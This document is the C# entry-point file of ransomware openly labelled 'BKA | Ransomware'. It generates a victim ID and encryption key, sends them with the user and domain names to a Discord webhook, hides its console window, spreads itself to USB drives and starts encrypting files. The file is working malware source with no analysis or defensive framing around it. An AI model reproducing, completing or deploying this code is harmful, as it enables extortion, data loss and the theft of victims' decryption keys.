using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Stub
{
    internal static class Program
    {
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        public static string ID = GenerateRandomKey(Config.IDLength);
        public static string Key = GenerateRandomKey(Config.KeyLength);


        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public static string GenerateRandomKey(int length)
        {
            const string validChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
            var randomBytes = new byte[length];

            using (var rng = new RNGCryptoServiceProvider())
            {
                rng.GetBytes(randomBytes);
            }

            var result = new char[length];

            for (int i = 0; i < length; i++)
            {
                result[i] = validChars[randomBytes[i] % validChars.Length];
            }

            return new string(result);
        }

        [STAThread]
        static async Task Main()
        {
          
            string avatarUrl = "https://cdn.discordapp.com/attachments/1118947131034710016/1138401446589636628/WYEYq4P.jpg";
            string username = "BKA | Ransomware";

            using (HttpClient client = new HttpClient())
            {
                MultipartFormDataContent content = new MultipartFormDataContent();


                content.Add(new StringContent(username), "username");
                content.Add(new StringContent(avatarUrl), "avatar_url");


                content.Add(new StringContent($"@everyone\n```Username:{Environment.UserName} / {Environment.UserDomainName}\nID:{ID}\nKey:{Key}"), "content");



                HttpResponseMessage response = await client.PostAsync(Config.DiscordWebhook, content);




            }


            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            Console.Title = "NYA :3";
            Console.Write("Starting...");
            infecting.Infectrandomusbfile();
            Encryption.Start();
        }
    }
}
